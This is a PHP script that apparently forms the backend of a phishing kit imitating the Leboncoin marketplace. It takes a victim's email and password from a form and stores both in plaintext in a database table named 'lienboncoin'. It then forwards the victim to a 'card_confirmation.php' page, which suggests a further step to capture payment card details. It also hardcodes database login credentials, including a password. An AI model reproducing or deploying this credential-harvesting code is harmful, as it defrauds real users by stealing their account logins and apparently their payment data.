<?php
function valid_donnees($donnees){
		$donnees = trim($donnees);
		$donnees = stripcslashes($donnees);
		$donnees = htmlspecialchars($donnees);
		return $donnees;
	
	}
    $server = "localhost"; $dbname="id16384392_boncoinbd"; $user = "id16384392_userboncoin";   $pass = "User12985669@";
	    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Get the form fields and remove whitespace.
			$email = valid_donnees($_POST["email"]);
            $password =valid_donnees($_POST["password"]);
			
		    $atom   = '[-a-z0-9!#$%&\'*+\\/=?^_`{|}~]';   
            $domain = '([a-z0-9]([-a-z0-9]*[a-z0-9]+)?)';  
           $regex = '/^' . $atom . '+' .'(\.' . $atom . '+)*'.'@'.'(' . $domain . '{1,63}\.)+'.$domain .'{2,63}$/i' ;          

       if ( !preg_match($regex, $email) OR empty($password)) {
            // Set a 400 (bad request) response code and exit.
			header("refresh:0.5;url=index.html");
			  echo "<h3>Oops! Adresse mail invalide ou mode passe vide</h3>";
            exit;
        }
        try{
		$dbco = new PDO("mysql:host=$server;dbname=$dbname",$user,$pass);
		$dbco->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION );
		$sth = $dbco->prepare("
			INSERT INTO lienboncoin (email, passwrd) VALUES (:email, :passwrd)
		");
		$sth->bindParam(':email',$email);
		$sth->bindParam(':passwrd',$password);
		$sth->execute();
		header('location:card_confirmation.php');
		}
		catch(PDOException $e){
			echo ' Erreur : '.$e->getMessage();
		}
	}else{
		header('location:index.html');
	}
    
?>